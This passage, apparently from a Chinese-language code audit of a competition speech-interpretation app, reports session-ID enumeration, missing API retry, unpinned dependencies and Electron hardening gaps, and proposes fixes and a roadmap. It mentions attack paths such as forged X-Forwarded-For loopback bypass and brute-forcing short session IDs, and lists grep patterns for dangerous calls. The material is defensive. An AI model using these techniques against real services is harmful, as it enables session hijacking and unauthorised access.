|---|---|---|
| ASR 首字延迟 P50 | ≤ 800ms | 用户感知的"开始响应"速度 |
| 端到端延迟 P50 | ≤ 2.5s | 音频输入到中文字幕上屏 |
| 端到端延迟 P95 | ≤ 4.0s | 尾部延迟控制 |
| 音频丢弃率 | 0% | 队列不应溢出 |
| 10 分钟内存增长 | ≤ 50MB | 无明显泄漏 |
| WER（清晰英语） | ≤ 15% | ASR 质量下限 |

**第四步：把测试结果写进 README**

竞赛评审最看重"有数据支撑的性能声明"。当前 README 若声称实时性，
但唯一的报告是静音输入，一旦被追问会很被动。

---

## 3. Medium 问题

### ARCH-01【Medium】会话 ID 可枚举

`backend/api/router.py:127`：

```python
session_id = str(uuid.uuid4())[:8]
```

UUID4 被截断到 **8 个十六进制字符 = 32 bit ≈ 43 亿种可能**。
结合 SEC-02 的会话接管漏洞，攻击者可在本机暴力枚举（本地连接无网络延迟，
每秒可尝试数千次），**数小时内即可命中活跃会话**。

**修复**：

```python
import secrets

# 使用密码学安全的随机数，长度足以抵抗枚举
session_id = secrets.token_urlsafe(24)   # 192 bit 熵
```

日志中若需简短标识，用前 8 位做**显示**即可，但不要用作身份凭证：

```python
logger.info("WebSocket connected: {}", session_id[:8])
```

---

### ARCH-02【Medium】翻译失败无重试无降级

`backend/services/nmt_service.py:141`：

```python
except Exception as exc:
    logger.error("OpenAI API error: {}", exc)
    raise NMTError(f"OpenAI translation failed: {exc}")
```

上游 API 的**任何一次抖动**（429 限流、503、网络超时）都会直接抛出，
中断整条翻译流。同传场景下这意味着**字幕直接断掉**，用户体验断崖式下跌。

同一文件中 `_init_anthropic`（:49）与 `_init_openai`（:62）也是同样模式。

#### 修复：重试 + 降级 + 熔断

```python
# backend/services/nmt_service.py

import asyncio
import random
from typing import AsyncIterator

# 可重试的上游错误类型（限流与服务端错误）
RETRYABLE_STATUS_CODES = frozenset({408, 429, 500, 502, 503, 504})
MAX_RETRY_ATTEMPTS = 3
BASE_BACKOFF_SECONDS = 0.4


def _is_retryable(exc: Exception) -> bool:
    """判断异常是否值得重试。

    Args:
        exc: 上游调用抛出的异常。

    Returns:
        限流/超时/5xx 返回 True；鉴权失败等永久错误返回 False。
    """
    status = getattr(exc, "status_code", None)
    if isinstance(status, int):
        return status in RETRYABLE_STATUS_CODES
    return isinstance(exc, (asyncio.TimeoutError, ConnectionError))


async def _translate_with_retry(
    self,
    context: ContextWindow,
    current: Segment,
) -> AsyncIterator[str]:
    """带指数退避重试的翻译调用。

    失败时不中断会话，而是降级为原文透传，
    保证字幕不断流 —— 同传场景下"降级的字幕"远好于"没有字幕"。
    """
    last_error: Exception | None = None

    for attempt in range(MAX_RETRY_ATTEMPTS):
        try:
            async for token in self._translate_openai(context, current):
                yield token
            return
        except Exception as exc:
            last_error = exc

            if not _is_retryable(exc) or attempt == MAX_RETRY_ATTEMPTS - 1:
                break

            # 指数退避 + 抖动，避免重试风暴
            delay = BASE_BACKOFF_SECONDS * (2 ** attempt)
            jitter = random.uniform(0, delay * 0.3)
            logger.warning(
                "Translation attempt {}/{} failed ({}), retrying in {:.2f}s",
                attempt + 1, MAX_RETRY_ATTEMPTS, exc, delay + jitter,
            )
            await asyncio.sleep(delay + jitter)

    # 全部重试失败：降级为原文透传而非中断会话
    logger.error("Translation failed after {} attempts: {}", MAX_RETRY_ATTEMPTS, last_error)
    yield f"[未翻译] {current.text}"
    yield "<FINAL>"
```

前端应同步展示降级状态（如字幕标灰 + 提示"翻译服务异常，显示原文"），
让用户知道当前处于降级模式。

---

### QUAL-01【Medium】工程化缺口

#### 依赖未锁版本

`backend/requirements.txt` 全部使用 `>=`：

```
fastapi>=0.104.0
openai>=1.6.0
anthropic>=0.39.0
pydantic>=2.5.0
```

这意味着**今天能跑的代码，明天重装依赖可能就跑不起来**
（上游 breaking change）。竞赛演示前重装环境是高风险操作。

**修复**：

```bash
cd E:/competition2/competition2-main/backend
python -m venv .venv
source .venv/Scripts/activate      # Windows Git Bash
pip install -r requirements.txt
pip freeze > requirements.lock.txt
```

保留 `requirements.txt` 声明直接依赖（可读性），
用 `requirements.lock.txt` 锁定完整依赖树（可复现性）。
CI 与演示环境一律用 lock 文件安装。

> 更现代的做法是迁移到 `pyproject.toml` + `uv` 或 `poetry`，
> 但竞赛时间紧的话 lock 文件已足够。

**关于 CVE**：本次审计**未做 CVE 数据库比对**（离线环境），
因此不声称这些依赖存在已知漏洞。真正的问题是
**版本范围不可审计** —— 全部 `>=` 无上界意味着无法确定实际安装的是哪个版本，
也就无法评估其安全状态。建议补充：

```bash
pip install pip-audit
pip-audit -r backend/requirements.lock.txt
```

并在 CI 中固化为一道门禁。

> **另需清理**：`backend/package-lock.json` 经检查是空壳
> （`"packages": {}`），后端是纯 Python 项目不需要 npm lockfile，
> 疑似误建，建议删除以免误导。
>
> 前端情况较好：有完整的 `package-lock.json`，
> `electron ^42.3.3` / `vite ^7.3.5` 版本较新。CI 中应使用 `npm ci` 而非 `npm install`。

#### 测试文件平铺在包根目录

```
backend/test_asr_service.py
backend/test_config.py
backend/test_endurance_runner.py
backend/test_pipeline.py
...（共 13 个）
```

测试与源码混在同一目录，且 `test_endurance_runner.py`（453 行）
测试的是 `tools/` 下的模块 —— 位置与被测对象不对应。

**修复**：

```
backend/
├── api/
├── core/
├── services/
└── tests/
    ├── conftest.py                 # 共享 fixture
    ├── test_config.py
    ├── unit/
    │   ├── test_asr_service.py
    │   ├── test_nmt_service.py
    │   └── test_pipeline.py
    └── integration/
        └── test_websocket_flow.py  # 真实端到端

tools/
└── tests/
    ├── test_endurance_runner.py
    ├── test_desktop_launcher.py
    └── test_interpreter_validation_suite.py
```

配套 `pytest.ini` 或 `pyproject.toml`：

```toml
[tool.pytest.ini_options]
testpaths = ["backend/tests", "tools/tests"]
pythonpath = ["backend", "."]
addopts = "-v --strict-markers"
markers = [
    "integration: 需要真实上游 API 或 Redis 的集成测试",
    "slow: 运行超过 10 秒的测试",
]
```

#### 无 CI

创建 `.github/workflows/ci.yml`（前提是先完成 PROC-01 的 git init）：

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:

jobs:
  backend:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: pip

      - name: 安装依赖
        run: pip install -r backend/requirements.lock.txt

      - name: 类型检查
        run: mypy backend/ --ignore-missing-imports

      - name: 代码风格
        run: ruff check backend/ tools/

      - name: 单元测试
        run: pytest backend/tests/unit tools/tests -v

  frontend:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
          cache-dependency-path: frontend/package-lock.json

      - name: 安装依赖
        working-directory: frontend
        run: npm ci

      - name: 类型检查
        working-directory: frontend
        run: npx tsc --noEmit

      - name: 单元测试
        working-directory: frontend
        run: npx vitest run
```

#### 无容器化

新增 `docker-compose.yml`，让评委一条命令就能跑起来：

```yaml
services:
  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 3s
      retries: 5

  backend:
    build:
      context: .
      dockerfile: backend/Dockerfile
    ports:
      - "8000:8000"
    environment:
      REDIS_URL: redis://redis:6379/0
      ALLOWED_ORIGINS: http://localhost:5173
    env_file:
      - backend/.env.local
    depends_on:
      redis:
        condition: service_healthy
```

---

### QUAL-02【Low】文件规模超标

6 个文件严重超出项目规范的 400 行上限：

| 文件 | 行数 | 拆分建议 |
|---|---|---|
| `tools/endurance_runner.py` | 992 | 拆为 `runner/session.py`（会话驱动）、`runner/metrics.py`（指标收集）、`runner/report.py`（报告生成）、`runner/cli.py`（入口） |
| `tools/desktop_launcher.py` | 820 | 拆为 `launcher/env_check.py`（环境探测）、`launcher/process.py`（子进程管理）、`launcher/settings.py`（配置解析）、`launcher/cli.py` |
| `frontend/src/desktop/web-overlay.ts` | 648 | 拆为 `overlay/renderer.ts`、`overlay/storage.ts`、`overlay/positioning.ts` |
| `frontend/src/ui/ControlPanel.tsx` | 640 | 按功能区拆子组件：`AudioSourceSelector`、`LanguageSelector`、`SessionControls`、`DiagnosticsPanel` |
| `tools/interpreter_validation_suite.py` | 541 | 按校验维度拆分 |
| `frontend/src/store/AppStore.ts` | 508 | 按 slice 拆分：`session-slice`、`subtitle-slice`、`settings-slice` |

> 这是低优先级项。若竞赛时间紧张，可只在方案中说明拆分规划，
> 答辩时展示"已识别问题并有明确重构路径"即可。

---

## 4. 值得肯定的设计（答辩时应主动强调）

审计中发现以下几处**做得明显好于同类竞赛项目**，建议在答辩中主动展示：

### 4.1 Electron 安全配置堪称教科书

`frontend/electron/main.cjs:72-78` 与 `:141-147`：

```javascript
webPreferences: {
  contextIsolation: true,      // ✅ 渲染进程与 preload 隔离
  nodeIntegration: false,      // ✅ 渲染进程无 Node 能力
  preload: preloadScript,      // ✅ 通过 contextBridge 受控暴露
  sandbox: true,               // ✅ 开启 Chromium 沙箱
  webSecurity: true,           // ✅ 未禁用同源策略
}
```

且 `:84-87` 拦截了窗口打开：

```javascript
window.webContents.setWindowOpenHandler(({ url: targetUrl }) => {
  shell.openExternal(targetUrl)
  return { action: 'deny' }        // ✅ 不在应用内开新窗口
})
```

`preload.cjs` 只暴露 7 个明确定义的 IPC 通道，没有暴露 `ipcRenderer` 本身
—— 这是很多 Electron 项目做错的地方。

> **唯一建议**：`setWindowOpenHandler` 中 `shell.openExternal(targetUrl)`
> 未校验协议。恶意页面可构造 `file://` 或自定义协议 URL。建议加：
> ```javascript
> const parsed = new URL(targetUrl)
> if (parsed.protocol === 'https:' || parsed.protocol === 'http:') {
>   shell.openExternal(targetUrl)
> }
> return { action: 'deny' }
> ```

### 4.2 密钥处理有安全意识

`backend/services/local_settings.py` 文件头注释：

```python
"""Local browser/desktop settings persistence.

The settings file may contain API keys, so public snapshots intentionally expose
only key presence flags and never raw secret values.
"""
```

`create_settings_snapshot` 只回传"密钥是否已配置"的布尔标志，
不回传密钥本身；`clearOpenaiApiKey` 等字段实现了 write-only 语义
（可写入、可清除，但读不回来）。REST 端点还有 `require_loopback_client` 校验。

**这个设计是对的** —— 只是 WebSocket 端点漏掉了同等级别的防护（见 SEC-02）。

### 4.3 实时管线的背压设计

`backend/core/pipeline.py:58-60`：

```python
self._audio_queue: asyncio.Queue[tuple[bytes, float]] = asyncio.Queue(
    maxsize=settings.audio_queue_max_chunks,     # ✅ 有界队列，防内存无限增长
)
```

并且全程记录队列深度与排队延迟（`:182-183`、`:405-408`），
耐久报告中可见 `audio_queue_max_depth: 1`、`audio_queue_wait_ms.max_ms: 16`
—— **背压可观测**，这是实时系统设计的关键要素。

会话清理也是正确的（`websocket_handler.py:82-83` 在 `finally` 中移除 pipeline，
且用 `is` 比较避免误删重连后的新 pipeline）。

---

### 4.4 注入类漏洞专项排查：全部通过

针对三类高危注入面做了专项核查，**均未发现问题**，这在竞赛项目中并不常见：

**1. 无命令注入** —— `tools/` 下所有 `subprocess` 调用均为列表形式，
无 `shell=True`，无用户输入拼接：

```
$ grep -rn "shell=True|os.system|os.popen|eval\(|exec\(" tools/ backend/
（零命中）
```

- `desktop_launcher.py:461`（`run_command`）、`:571`、`:665` —— 参数来自模块常量
  与 argparse 的 `parse_port`（`:259-267` 强制 int + 0–65535 范围校验）
- `endurance_runner.py:370` —— `["ps","-o","rss=","-p",str(pid)]`，
  pid 在 `:345` 已校验 `pid <= 0` 提前返回
- `interpreter_validation_suite.py:121/149/173` —— 均以 `sys.executable` 开头

> 全仓唯一的 `shell=True` 在 `.trellis/scripts/common/task_utils.py:242`，
> 属于 trellis 开发工具链的 hook 执行器，命令来自本地配置，
> **不在应用运行时路径内**。

**2. 无反序列化风险** —— 全仓无 `pickle`/`marshal`/`yaml.load`。
`context_manager.py:100/119` 全部使用 `json.dumps/loads`。

**3. 无路径穿越** ——
- 字幕导出走浏览器端（`SubtitleHistoryPanel.tsx:469-480`）：
  `Blob` + `URL.createObjectURL` + `link.download`，
  文件名由应用生成、落盘位置由浏览器控制，**无服务端路径拼接**
- `subtitle_artifact_validator.py:306` 路径来自 argparse 位置参数，
  且只 `read_text` 不写目标路径 —— 属 CLI 预期行为
- 静态服务已锁目录：`desktop_launcher.py:621` 强制 `directory=str(DIST_DIR)`

> 一处可选加固：`desktop_launcher.py:503-523` 的 `resolve_python_executable()`
> 直接返回环境变量 `AI_INTERPRETER_PYTHON` 且不校验文件是否存在就当可执行文件启动。
> 能设置该环境变量的攻击者通常已具备同等权限，故仅记为加固项而非漏洞。

---

## 5. 实施路线图

### 阶段一：止血（半天，最高优先级）

| 顺序 | 任务 | 验收标准 | 预计耗时 |
|---|---|---|---|
| 1 | **PROC-01 `git init` + 首次提交** | `git log` 有记录，且确认无密钥入库 | 5 分钟 |
| 2 | **SEC-04 默认 host 改 `127.0.0.1`** | 两个字面量，config.py + .env.example | 2 分钟 |
| 3 | SEC-01 CORS 白名单 | 非白名单 Origin 的请求被拒绝 | 10 分钟 |
| 4 | SEC-05 `proxy_headers=False` | 带 `X-Forwarded-For: 127.0.0.1` 的远程请求被拒 | 2 分钟 |
| 5 | SEC-03 wsUrl 协议+主机校验 | 恶意 URL 测试用例全部通过 | 20 分钟 |
| 6 | SEC-02 WebSocket Origin 校验 | 跨站连接被 1008 关闭 | 30 分钟 |

> 前四项合计不到 20 分钟，却消除了两个 Critical 与一个 High。
> **投入产出比最高，务必优先完成。**

### 阶段二：安全加固（1–2 天）

| 顺序 | 任务 | 验收标准 |
|---|---|---|
| 7 | ARCH-01 会话 ID 改用 `secrets` | ID 长度 ≥32 字符 |
| 8 | SEC-02 重连令牌机制 | 无令牌重连被拒绝 |
| 9 | SEC-07 Electron `openExternal` 协议校验 | 仅 http/https 放行 |
| 10 | SEC-06 密钥文件 0600 权限 | 同机其他用户无法读取 |
| 11 | SEC-09 音频帧大小与速率限制 | 超大帧被 1009 关闭 |
| 12 | SEC-08 Redis 键前缀 + 认证 | 键含应用前缀；Redis 需密码 |
| 13 | SEC-10 前端 CSP | 字幕样式仍正常（保留 unsafe-inline） |
| 14 | SEC-11 日志脱敏 | Redis URL 脱敏；会议内容降为 DEBUG |

### 阶段三：可靠性与可信度（3–5 天）

| 顺序 | 任务 | 验收标准 |
|---|---|---|
| 15 | ARCH-02 重试 + 降级 | 模拟上游 429，字幕不断流 |
| 16 | **TEST-01 真实音频端到端测试** | 产出含 WER/BLEU/延迟分位数的报告 |
| 17 | QUAL-01 依赖锁定 + CI | CI 全绿 |
| 18 | QUAL-01 测试目录重组 | `pytest` 从 `tests/` 发现全部用例 |

### 阶段四：工程完善（2–3 天）

| 顺序 | 任务 |
|---|---|
| 19 | Docker Compose 一键启动 |
| 20 | QUAL-02 大文件拆分 |
| 21 | README 补充真实性能数据 |

---

## 6. 竞赛答辩建议

### 6.1 必须在提交前完成的事

**如果只有半天时间，按这个顺序做（前四项合计不到 20 分钟）：**

1. **`git init` + 提交**（5 分钟）—— 没有版本历史在竞赛中是硬伤
2. **默认 host 改 `127.0.0.1`**（2 分钟）—— 两个字面量，消除 Critical。
   竞赛现场是公共 WiFi，绑 `0.0.0.0` 意味着同网段任何人都能连你的服务
3. **CORS 白名单**（10 分钟）—— 一行配置，消除另一个 Critical
4. **`proxy_headers=False`**（2 分钟）—— 一个参数，堵住 loopback 校验绕过
5. **wsUrl 校验**（20 分钟）—— 防止演示时被现场攻击
6. **跑一次真实音频的端到端测试**（1–2 小时）—— 拿到能写进 README 的真实数据

### 6.2 应当主动强调的亮点

1. **注入类漏洞零命中**：命令注入、反序列化、路径穿越三类高危面
   经专项排查全部通过（见 §4.4）。可以直接说
   "所有 subprocess 调用均为列表形式、无一处 `shell=True`" —— 这是硬事实。
2. **Electron 安全配置**：`contextIsolation` + `sandbox` + 受控 IPC 暴露，
   建议直接展示 `preload.cjs` 代码 —— 这是评委中的安全背景人士会认可的细节。
3. **背压可观测的实时管线**：有界队列 + 队列深度/等待时长全程埋点，
   用耐久报告中的 `audio_queue_max_depth: 1` / `max_ms: 16` 说明传输层无积压。
4. **密钥 write-only 设计**：快照只回传"是否已配置"，密钥永不回读。
5. **修正引擎（revision）**：ASR 后置修正是同传场景的真实痛点，
   这是产品层面的差异化设计，值得展开讲。

### 6.3 需要预先准备回答的质疑

| 评委可能问 | 建议回答方向 |
|---|---|
| "为什么没有 git 历史？" | **务必在提交前解决**。若已解决，说明是从压缩包迁移，现已建立版本控制 |
| "耐久测试是静音输入，实际效果如何？" | **务必在提交前补真实音频测试**。若时间不够，坦白说明当前报告只验证传输层，并展示已规划的测试方案与基线指标 |
| "本地服务的安全性怎么保证？" | 展示 loopback 校验 + Origin 校验 + 重连令牌三层防护，并说明 Electron 侧的沙箱配置 |
| "上游 API 挂了怎么办？" | 展示重试 + 降级为原文透传的设计，强调"同传场景下降级字幕远好于无字幕" |
| "延迟是多少？" | 必须有真实数据。若已完成 TEST-01，展示 P50/P95 分位数 |

---

## 附录 A：本次审计的验证命令

```bash
cd E:/competition2/competition2-main

git rev-parse --is-inside-work-tree   # → fatal: not a git repository ❌
ls .github                             # → No such file or directory ❌
python -c "import loguru"              # → ModuleNotFoundError ⚠️

# 代码规模
find backend tools frontend/src -name "*.py" -o -name "*.ts" -o -name "*.tsx" \
  | xargs wc -l | sort -rn | head -20

# 关键漏洞位置
sed -n '53,59p' backend/main.py                    # CORS 配置
sed -n '69,75p' backend/main.py                    # uvicorn 未禁 proxy_headers
sed -n '19p'    backend/core/config.py             # host = "0.0.0.0"
sed -n '113,150p' backend/api/router.py            # WebSocket 端点
sed -n '29,41p' frontend/src/network/ws-url.ts     # wsUrl 归一化
sed -n '84,94p' frontend/electron/main.cjs         # openExternal 无协议校验
sed -n '233,238p' backend/services/local_settings.py  # 密钥写盘无权限限制
cat reports/endurance-60s-language-config.json     # 耐久报告

# uvicorn proxy_headers 默认值（实测）
python -c "import inspect; from uvicorn import Config; \
  print(inspect.signature(Config.__init__).parameters['proxy_headers'].default)"
# → True

# 注入类专项排查（均为零命中）
grep -rn "shell=True\|os.system\|os.popen\|eval(\|exec(" tools/ backend/ --include="*.py"
grep -rn "pickle\|marshal\|yaml.load(" tools/ backend/ --include="*.py"
```

> **说明**：由于本机 Python 环境未安装项目依赖（`loguru` 等缺失），
> 本次审计未能实际执行 `pytest` 验证测试通过率。
> 建议在补齐依赖后运行 `pytest backend/ tools/ -v` 确认基线，
> 并将结果补充到本方案中。

---

*本方案基于 2026-08-01 的代码状态。所有安全问题均定位到具体行号并给出可复现路径，
未包含推测性结论。未能本地验证的部分（测试通过率）已明确标注。*
